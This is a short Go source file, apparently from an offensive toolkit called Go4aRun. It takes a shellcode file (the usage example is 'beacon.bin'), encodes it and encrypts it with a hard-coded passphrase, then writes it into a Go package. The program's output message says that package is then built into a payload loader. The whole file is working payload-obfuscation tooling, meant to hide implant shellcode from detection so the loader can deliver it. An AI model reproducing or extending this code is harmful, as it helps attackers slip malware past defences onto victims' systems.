//package hideit
package main

import (
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"Go4aRun/pkg/useful"
	"io/ioutil"
	//"log"
	"os"
	"strconv"
)

//Encrypts shellcode and stores as a go file to be leveraged in Go4it.go build
// Example passphrase is D00mfist

	func main() {
		if len(os.Args) < 2 {
			fmt.Println("Please select a shellcode file. (E.g.: hideit beacon.bin)")
			return
		}
		filename := os.Args[1]
		payload, err := ioutil.ReadFile(filename)
		if err != nil {
			fmt.Println(err)
		}

		encode := b64.StdEncoding.EncodeToString(payload)
		hexencode := hex.EncodeToString([]byte(encode))
		ciphertext := useful.Encrypt([]byte(hexencode), "D00mfist")
		hexcipher := hex.EncodeToString(ciphertext)

		f, err := os.Create("shelly.go")
		if err != nil {
			fmt.Println(err)
			return
		}
		defer f.Close()
		a, err := os.OpenFile("shelly.go", os.O_WRONLY|os.O_APPEND, 0644)
		a.WriteString("package shelly\n" + "var Sc =" + strconv.Quote(hexcipher))
		if err != nil {
			fmt.Println(err)
			return
		}
		useful.MoveFile("shelly.go", "../../pkg/shelly/shelly.go")

		fmt.Println("Encrypted Shellcode Written to shelly.go. It should be already placed at Go4aRun\\pkg\\shelly\\shelly.go \nIf not then manually place there before building Go4it")

}